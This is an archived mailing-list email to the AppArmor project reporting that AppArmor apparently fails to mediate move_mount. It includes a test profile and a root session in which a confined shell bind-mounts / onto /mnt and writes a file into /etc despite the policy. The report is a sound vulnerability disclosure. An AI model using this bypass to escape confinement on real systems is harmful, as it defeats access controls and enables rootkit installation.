Return-Path: <apparmor-bounces@lists.ubuntu.com>
X-Original-To: lists+apparmor@lfdr.de
Delivered-To: lists+apparmor@lfdr.de
Received: from lists.ubuntu.com (lists.ubuntu.com [185.125.189.65])
	by mail.lfdr.de (Postfix) with ESMTPS id CE999799DD4
	for <lists+apparmor@lfdr.de>; Sun, 10 Sep 2023 13:07:10 +0200 (CEST)
Received: from localhost ([127.0.0.1] helo=lists.ubuntu.com)
	by lists.ubuntu.com with esmtp (Exim 4.86_2)
	(envelope-from <apparmor-bounces@lists.ubuntu.com>)
	id 1qfIHJ-0003hJ-Oz; Sun, 10 Sep 2023 11:06:57 +0000
Received: from mail-vs1-f50.google.com ([209.85.217.50])
 by lists.ubuntu.com with esmtps (TLS1.2:ECDHE_RSA_AES_128_GCM_SHA256:128)
 (Exim 4.86_2) (envelope-from <anstein99@googlemail.com>)
 id 1qdXGS-0000FZ-4k
 for apparmor@lists.ubuntu.com; Tue, 05 Sep 2023 14:42:48 +0000
Received: by mail-vs1-f50.google.com with SMTP id
 ada2fe7eead31-44d5696fad1so662374137.1
 for <apparmor@lists.ubuntu.com>; Tue, 05 Sep 2023 07:42:47 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=googlemail.com; s=20221208; t=1693924967; x=1694529767; darn=lists.ubuntu.com;
 h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
 :date:message-id:reply-to;
 bh=LYz2vbEJRgblo+0Q2J89ijQiKx1cbjC9QiVjzgcBoTU=;
 b=jUcXqlKrnBbEP+1I2mcTqhajvSudGTbuRn0s2eiWw990MHgEPv8jzAfnogFLBzoNcD
 qM0cWCFP2LurXQx15z2qrQZCLH3z6WwvgGCyiDqyTNC/X4+x1ZGcKmqG5sJafYKdhPtb
 XOQwPNv41sw7Z+p7i89syYj6fZXGMalyexsuzPlHdnSm7C7ZnyJjldIpvoMHAM0EYL5f
 KgzCZPbY4lfavu2za1LK5Fp+R7X9U1xdJUa3NoE/sdSJj7dTCap+3YqgRXzzaXI5INRw
 P4G4tRU3C4waQbsKTuZY7fmaZDtnVySalROWV5v6v/eN+hfyDAt7CFQgGRso8tFm53xL
 efGQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20221208; t=1693924967; x=1694529767;
 h=to:subject:message-id:date:from:mime-version:x-gm-message-state
 :from:to:cc:subject:date:message-id:reply-to;
 bh=LYz2vbEJRgblo+0Q2J89ijQiKx1cbjC9QiVjzgcBoTU=;
 b=LbR60M+3GgzMH4KCR+22rvs6xzJXSdFV0RYbPknrEiGpRIaE85LI2gn1ETZc8yCxVd
 dZiPfhRHkJIAUcjUKD48g2wB3rsgFlWvxvLXulJHQwy+t47TBHDANZLr59po5q04h3aT
 JlooAzk3TvpDxzL051MuSU8ecoVt830qQJGxO2K+COZXB3sbtdMtGc9Rro6appGopfH9
 VDh9cj6wTJMYxc2Ss1UYXHqmxx+fHzmOMVHzw6pQqbr90W/Cn8eCquxoVz1Eie4uDy2X
 VTPcCmYfNGo4FFUWtSxEzbn1fNEU8UiOy7+bJTTBUm3lKV6DP6Jq2usVJmiftySbEyZ+
 fhcg==
X-Gm-Message-State: AOJu0YzcTkvjP47u/vW01MC4wLOUcTVjbyQQyYxuJkGrQvZHrfZ5LTHU
 1TBnrK9HuiC0TXE3b4o7IJCVyaXCe0/JHJddK96H+5FWe3A=
X-Google-Smtp-Source: AGHT+IH4NTnLaaXvP9f7Kr4PU6zFy2g8UM1yeCxxZQ4Q3HQfz0krtua3R5y1y9jPp/SHYFesjFWzmyT1qF5URnHCDwA=
X-Received: by 2002:a67:fa14:0:b0:44d:4be4:fe39 with SMTP id
 i20-20020a67fa14000000b0044d4be4fe39mr8270436vsq.5.1693924966867; Tue, 05 Sep
 2023 07:42:46 -0700 (PDT)
MIME-Version: 1.0
From: Andreas Steinmetz <anstein99@googlemail.com>
Date: Tue, 5 Sep 2023 14:42:29 +0000
Message-ID: <CAOTMNwtt9=ig9dtOxqyLVBthh+tJJkZEv64qpGN43+-sCBtRrw@mail.gmail.com>
To: apparmor@lists.ubuntu.com
Content-Type: text/plain; charset="UTF-8"
Received-SPF: pass client-ip=209.85.217.50;
 envelope-from=anstein99@googlemail.com; helo=mail-vs1-f50.google.com
X-Mailman-Approved-At: Sun, 10 Sep 2023 11:06:56 +0000
Subject: [apparmor] move_mount not handled by AppArmor completely subverts
	security
X-BeenThere: apparmor@lists.ubuntu.com
X-Mailman-Version: 2.1.20
Precedence: list
List-Id: AppArmor discussion <apparmor.lists.ubuntu.com>
List-Unsubscribe: <https://lists.ubuntu.com/mailman/options/apparmor>,
 <mailto:apparmor-request@lists.ubuntu.com?subject=unsubscribe>
List-Archive: <https://lists.ubuntu.com/archives/apparmor>
List-Post: <mailto:apparmor@lists.ubuntu.com>
List-Help: <mailto:apparmor-request@lists.ubuntu.com?subject=help>
List-Subscribe: <https://lists.ubuntu.com/mailman/listinfo/apparmor>,
 <mailto:apparmor-request@lists.ubuntu.com?subject=subscribe>
Errors-To: apparmor-bounces@lists.ubuntu.com
Sender: "AppArmor" <apparmor-bounces@lists.ubuntu.com>

Tested with kernel 6.4.12-arch1-1

AppArmor seemingly doesn't handle the move_mount system call. Thus
only CAP_SYS_ADMIN is required to bind mount any directory anywhere.
This allows to completely subvert security including e.g. rootkit
installation for a process that actually should be confined by an
enforced AppArmor policy.

Simple policy that should deny mounts and prevent system modification:

abi <abi/3.0>,
profile minimal {
 capability sys_admin,
 /bin/bash mr,
 /etc/** mrlk,
 /mnt/** mrwlk,
 /usr/** mrlkix,
 /proc/*/attr/apparmor/current r,
}

The following test then run as root:

[root /]# aa-exec -p minimal /bin/bash
bash: /dev/null: Permission denied
bash: /root/.bashrc: Permission denied
[root /]# cat /proc/self/attr/apparmor/current
minimal (enforce)
[root /]# ls -l /etc/malicious_software
ls: cannot access '/etc/malicious_software': No such file or directory
[root /]# touch /etc/malicious_software
touch: cannot touch '/etc/malicious_software': Permission denied
[root /]# mount --bind / /mnt
[root /]# touch /mnt/etc/malicious_software
[root /]# ls -l /etc/malicious_software
-rw-r--r-- 1 root root 0 Sep  5 16:27 /etc/malicious_software
[root /]#

This test case is very legitimate as it shows that the MAC enforcement
by AppArmor is completely bypassed, resulting is standard DAC access
control, which is not supposed to happen, especially as the enforced
profile does not allow for any mount operation.

Probably the whole set of system calls mentioned in
https://lwn.net/Articles/759499/ is probably not handled and thus
affected.

